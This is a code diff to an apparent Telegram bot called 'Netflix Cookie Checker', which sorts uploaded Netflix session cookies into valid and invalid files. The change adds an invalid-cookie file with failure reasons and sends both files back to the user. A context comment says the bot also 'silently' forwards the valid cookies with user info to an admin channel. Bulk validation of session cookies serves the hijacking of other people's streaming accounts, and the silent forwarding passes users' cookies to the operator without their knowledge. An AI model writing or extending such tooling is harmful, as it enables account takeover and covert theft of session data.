@@ -196,7 +196,9 @@ async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id, u
 
     # Create filenames with count and timestamp
     valid_filename = f"valid_cookies_{len(valid_lines)}_{checker.mode}_{file_timestamp}.txt"
+    invalid_filename = f"invalid_cookies_{len(invalid_lines)}_{checker.mode}_{file_timestamp}.txt"
     valid_temp_filepath = os.path.join(tempfile.gettempdir(), valid_filename)
+    invalid_temp_filepath = os.path.join(tempfile.gettempdir(), invalid_filename)
 
     try:
         # Save valid cookies
@@ -205,6 +207,12 @@ async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id, u
                 for line in valid_lines:
                     f.write(f"{line}\n")
 
+        # Save invalid cookies
+        if invalid_lines:
+            with open(invalid_temp_filepath, "w", encoding="utf-8") as f:
+                for line, reason in invalid_lines:
+                    f.write(f"{line} | Reason: {reason}\n")
+
         # Format message text for user
         msg_text = (
             f"🍪 Netflix Cookie Checker Results\n"
@@ -212,18 +220,31 @@ async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id, u
             f"✅ Valid Cookies: {len(valid_lines)}\n"
             f"❌ Invalid Cookies: {len(invalid_lines)}\n"
             f"📅 Date: {display_timestamp}\n\n"
-            f"{valid_filename}"
         )
+        
         # Send stats message first
         await bot.send_message(chat_id, msg_text)
-        # Then send valid file as document
+        
+        # Send valid file to user if exists
         if valid_lines:
             with open(valid_temp_filepath, 'rb') as doc:
                 await bot.send_document(
                     chat_id=chat_id,
                     document=doc,
-                    filename=valid_filename
+                    filename=valid_filename,
+                    caption="✅ Valid Cookies"
                 )
+                
+        # Send invalid file to user if exists
+        if invalid_lines:
+            with open(invalid_temp_filepath, 'rb') as doc:
+                await bot.send_document(
+                    chat_id=chat_id,
+                    document=doc,
+                    filename=invalid_filename,
+                    caption="❌ Invalid Cookies"
+                )
+
         # Also send a copy to the admin channel silently (only valid file, with user info)
         try:
             if TELEGRAM_CHAT_ID:
@@ -259,7 +280,7 @@ async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id, u
 
     finally:
         # Clean up the temp files
-        for filepath in [valid_temp_filepath]:
+        for filepath in [valid_temp_filepath, invalid_temp_filepath]:
             if os.path.exists(filepath):
                 os.remove(filepath)
 
